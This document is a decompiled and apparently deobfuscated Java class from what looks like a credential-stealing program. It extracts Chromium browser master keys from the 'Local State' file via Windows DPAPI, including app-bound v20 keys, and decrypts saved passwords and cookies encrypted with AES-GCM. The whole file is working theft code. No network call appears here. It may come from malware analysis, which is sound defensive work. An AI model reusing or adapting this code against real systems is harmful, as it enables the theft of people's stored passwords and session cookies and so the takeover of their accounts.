/* DEOBFUSCATED: CryptoDecryptor_MasterKeys.java (inner class) */\n\n/*
 * Decompiled with CFR 0.152.
 */
package c;

import c.g$MasterKeys;
import c.h;
import c.o;
import c.r;
import com.sun.jna.platform.win32.Crypt32Util;
import java.io.File;
import java.nio.charset.StandardCharsets;
import java.security.Key;
import java.security.MessageDigest;
import java.util.Arrays;
import java.util.Base64;
import java.util.concurrent.ConcurrentHashMap;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import org.apache.commons.io.FileUtils;
import org.json.JSONObject;

public final class g {
    private static final String DPAPI_PREFIX = "DPAPI" /* r.dp() */;
    private static final ConcurrentHashMap<String, g$MasterKeys> b = new ConcurrentHashMap();

    private g() {
    }

    public static g$MasterKeys getMasterKeys(File file, String string) {
        if (file == null || !file.exists()) {
            return new g$MasterKeys(null, null);
        }
        String string2 = file.getAbsolutePath();
        g$MasterKeys g$MasterKeys = b.get(string2);
        if (g$MasterKeys != null) {
            return g$MasterKeys;
        }
        try {
            g$MasterKeys g$MasterKeys2;
            JSONObject jSONObject;
            String string3 = FileUtils.readFileToString(file, StandardCharsets.UTF_8);
            if (string3 != null && !string3.isEmpty() && string3.charAt(0) == '\ufeff') {
                string3 = string3.substring(1);
            }
            if (!(jSONObject = new JSONObject(string3)).has("os_crypt" /* r.osc() */)) {
                return new g$MasterKeys(null, null);
            }
            JSONObject jSONObject2 = jSONObject.getJSONObject("os_crypt" /* r.osc() */);
            byte[] byArray = g.loadV10Key(jSONObject2);
            byte[] byArray2 = null;
            if (string != null && !string.isEmpty() && jSONObject2.has("app_bound_encrypted_key" /* r.abek() */)) {
                byArray2 = h.getMasterKeyV20(string, string2);
            }
            if ((g$MasterKeys2 = new g$MasterKeys(byArray, byArray2)).hasAny()) {
                b.put(string2, g$MasterKeys2);
            }
            return g$MasterKeys2;
        }
        catch (Exception exception) {
            return new g$MasterKeys(null, null);
        }
    }

    @Deprecated
    public static byte[] getDecryptionKey(File file) {
        return g.getDecryptionKey(file, null);
    }

    @Deprecated
    public static byte[] getDecryptionKey(File file, String string) {
        String string2 = string != null ? o.normalizeKey(string) : null;
        return g.getMasterKeys(file, string2).primaryKey();
    }

    public static void clearKeyCache() {
        b.clear();
        h.clearCache();
    }

    private static byte[] loadV10Key(JSONObject jSONObject) {
        try {
            if (!jSONObject.has("encrypted_key" /* r.ek() */)) {
                return null;
            }
            String string = jSONObject.getString("encrypted_key" /* r.ek() */);
            if (string == null || string.isEmpty()) {
                return null;
            }
            byte[] byArray = Base64.getDecoder().decode(string);
            if (byArray.length <= a.length()) {
                return null;
            }
            String string2 = new String(Arrays.copyOfRange(byArray, 0, a.length()), StandardCharsets.US_ASCII);
            if (!a.equals(string2)) {
                return null;
            }
            byte[] byArray2 = Arrays.copyOfRange(byArray, a.length(), byArray.length);
            byte[] byArray3 = Crypt32Util.cryptUnprotectData(byArray2);
            if (byArray3 == null || byArray3.length == 0) {
                return null;
            }
            if (byArray3.length >= 32) {
                return Arrays.copyOf(byArray3, 32);
            }
            if (byArray3.length == 16) {
                byte[] byArray4 = new byte[32];
                System.arraycopy(byArray3, 0, byArray4, 0, 16);
                return byArray4;
            }
            return byArray3;
        }
        catch (Exception exception) {
            return null;
        }
    }

    public static String decrypt(byte[] byArray, g$MasterKeys g$MasterKeys) {
        boolean bl;
        if (byArray == null || byArray.length == 0) {
            return "";
        }
        if (g$MasterKeys == null) {
            g$MasterKeys = new g$MasterKeys(null, null);
        }
        if (byArray.length < 3) {
            return "";
        }
        byte by = byArray[0];
        byte by2 = byArray[1];
        byte by3 = byArray[2];
        boolean bl2 = by == 118 && by2 == 49 && by3 == 48;
        boolean bl3 = by == 118 && by2 == 49 && by3 == 49;
        boolean bl4 = bl = by == 118 && by2 == 50 && by3 == 48;
        if (bl || bl2 || bl3) {
            String string = g.decryptChromiumAes(byArray, g$MasterKeys, bl);
            if (string != null && !string.isEmpty() && !g.looksLikeCipherDump(string)) {
                return string;
            }
            return "";
        }
        try {
            return new String(Crypt32Util.cryptUnprotectData(byArray), StandardCharsets.UTF_8);
        }
        catch (Exception exception) {
            if (byArray.length >= 4 && byArray[0] == 1 && byArray[1] == 0 && byArray[2] == 0 && byArray[3] == 0) {
                try {
                    return new String(Crypt32Util.cryptUnprotectData(byArray), StandardCharsets.UTF_8);
                }
                catch (Exception exception2) {
                    return "";
                }
            }
            if (g.isMostlyPrintable(byArray)) {
                String string = new String(byArray, StandardCharsets.UTF_8).trim();
                return g.looksLikeCipherDump(string) ? "" : string;
            }
            return "";
        }
    }

    private static String decryptChromiumAes(byte[] byArray, g$MasterKeys g$MasterKeys, boolean bl) {
        if (g$MasterKeys == null) {
            return "";
        }
        byte[] byArray2 = bl ? g$MasterKeys.b : g$MasterKeys.a;
        byte[] byArray3 = bl ? g$MasterKeys.a : g$MasterKeys.b;
        String string = g.decryptAesGcm(byArray, byArray2);
        if (string == null || string.isEmpty()) {
            string = g.decryptAesGcm(byArray, byArray3);
        }
        return string != null ? string : "";
    }

    private static String decryptAesGcm(byte[] byArray, byte[] byArray2) {
        byte[] byArray3 = g.decryptV10Bytes(byArray, byArray2);
        return byArray3 != null ? g.bytesToUtf8String(byArray3) : "";
    }

    private static boolean looksLikeCipherDump(String string) {
        if (string == null || string.length() < 3) {
            return false;
        }
        char c2 = string.charAt(0);
        char c3 = string.charAt(1);
        char c4 = string.charAt(2);
        if (!(c2 != 'v' && c2 != 'V' && c2 != 'a' && c2 != 'A' || c3 != '1' || c4 != '0' && c4 != '1')) {
            return true;
        }
        return c2 == 'v' && c3 == '2' && c4 == '0';
    }

    private static boolean isMostlyPrintable(byte[] byArray) {
        int n2 = Math.min(byArray.length, 50);
        for (int i2 = 0; i2 < n2; ++i2) {
            byte by = byArray[i2];
            if (by >= 32 || by == 9 || by == 10 || by == 13) continue;
            return false;
        }
        return true;
    }

    public static String decrypt(byte[] byArray, byte[] byArray2) {
        return g.decrypt(byArray, new g$MasterKeys(byArray2, byArray2));
    }

    public static String decrypt(byte[] byArray, byte[] byArray2, String string) {
        return g.decrypt(byArray, byArray2);
    }

    public static String decryptCookie(byte[] byArray, g$MasterKeys g$MasterKeys, String string) {
        if (byArray == null || byArray.length == 0) {
            return "";
        }
        if (g$MasterKeys == null) {
            g$MasterKeys = new g$MasterKeys(null, null);
        }
        try {
            String string2;
            if (byArray.length >= 3) {
                boolean bl;
                byte by = byArray[0];
                byte by2 = byArray[1];
                byte by3 = byArray[2];
                boolean bl2 = by == 118 && by2 == 50 && by3 == 48;
                boolean bl3 = bl = by == 118 && by2 == 49 && (by3 == 48 || by3 == 49);
                if (bl2 || bl) {
                    byte[] byArray2 = g.decryptV10Bytes(byArray, bl2 ? g$MasterKeys.b : g$MasterKeys.a);
                    if (byArray2 == null || byArray2.length == 0) {
                        byArray2 = g.decryptV10Bytes(byArray, bl2 ? g$MasterKeys.a : g$MasterKeys.b);
                    }
                    if (byArray2 != null && byArray2.length > 0) {
                        return g.bytesToUtf8String(g.finishCookiePlaintext(byArray2, string, bl2));
                    }
                    return "";
                }
            }
            return (string2 = g.decrypt(byArray, g$MasterKeys)) != null && !string2.isEmpty() ? string2 : "";
        }
        catch (Exception exception) {
            return "";
        }
    }

    private static byte[] finishCookiePlaintext(byte[] byArray, String string, boolean bl) {
        if (byArray == null || byArray.length <= 32) {
            return byArray;
        }
        if (string != null && !string.isEmpty()) {
            for (String string2 : g.hostKeyVariants(string)) {
                try {
                    MessageDigest messageDigest = MessageDigest.getInstance("SHA-256");
                    byte[] byArray2 = messageDigest.digest(string2.getBytes(StandardCharsets.UTF_8));
                    if (Arrays.equals(byArray2, Arrays.copyOf(byArray, 32))) {
                        return Arrays.copyOfRange(byArray, 32, byArray.length);
                    }
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }
        }
        if (bl || g.hasBinaryPrefix32(byArray)) {
            return Arrays.copyOfRange(byArray, 32, byArray.length);
        }
        return byArray;
    }

    private static String[] hostKeyVariants(String string) {
        if (string == null || string.isEmpty()) {
            return new String[0];
        }
        if (string.startsWith(".")) {
            return new String[]{string, string.substring(1)};
        }
        return new String[]{string, "." + string};
    }

    private static boolean hasBinaryPrefix32(byte[] byArray) {
        for (int i2 = 0; i2 < 32 && i2 < byArray.length; ++i2) {
            byte by = byArray[i2];
            if (by >= 32 || by == 9 || by == 10 || by == 13) continue;
            return true;
        }
        return false;
    }

    private static String bytesToUtf8String(byte[] byArray) {
        if (byArray == null || byArray.length == 0) {
            return "";
        }
        String string = new String(byArray, StandardCharsets.UTF_8).trim();
        if (!string.isEmpty()) {
            return string;
        }
        string = new String(byArray, StandardCharsets.ISO_8859_1).trim();
        return !string.isEmpty() ? string : "";
    }

    private static byte[] decryptV20Bytes(byte[] byArray, byte[] byArray2) {
        if (byArray == null || byArray2 == null || byArray2.length != 32 || byArray.length <= 31) {
            return null;
        }
        try {
            byte[] byArray3 = Arrays.copyOfRange(byArray, 3, 15);
            byte[] byArray4 = Arrays.copyOfRange(byArray, 15, byArray.length);
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            cipher.init(2, (Key)new SecretKeySpec(byArray2, "AES"), new GCMParameterSpec(128, byArray3));
            byte[] byArray5 = cipher.doFinal(byArray4);
            return byArray5 != null && byArray5.length > 0 ? byArray5 : null;
        }
        catch (Exception exception) {
            return null;
        }
    }

    private static String decryptV20(byte[] byArray, byte[] byArray2) {
        byte[] byArray3 = g.decryptV20Bytes(byArray, byArray2);
        return byArray3 != null ? g.bytesToUtf8String(byArray3) : "";
    }

    private static byte[] decryptV10Bytes(byte[] byArray, byte[] byArray2) {
        if (byArray == null || byArray2 == null || byArray2.length == 0 || byArray.length <= 31) {
            return null;
        }
        try {
            byte[] byArray3 = Arrays.copyOfRange(byArray, 3, 15);
            byte[] byArray4 = Arrays.copyOfRange(byArray, 15, byArray.length);
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            cipher.init(2, (Key)new SecretKeySpec(byArray2, "AES"), new GCMParameterSpec(128, byArray3));
            byte[] byArray5 = cipher.doFinal(byArray4);
            return byArray5 != null && byArray5.length > 0 ? byArray5 : null;
        }
        catch (Exception exception) {
            return null;
        }
    }

    private static String decryptV10(byte[] byArray, byte[] byArray2) {
        byte[] byArray3 = g.decryptV10Bytes(byArray, byArray2);
        return byArray3 != null ? g.bytesToUtf8String(byArray3) : "";
    }
}

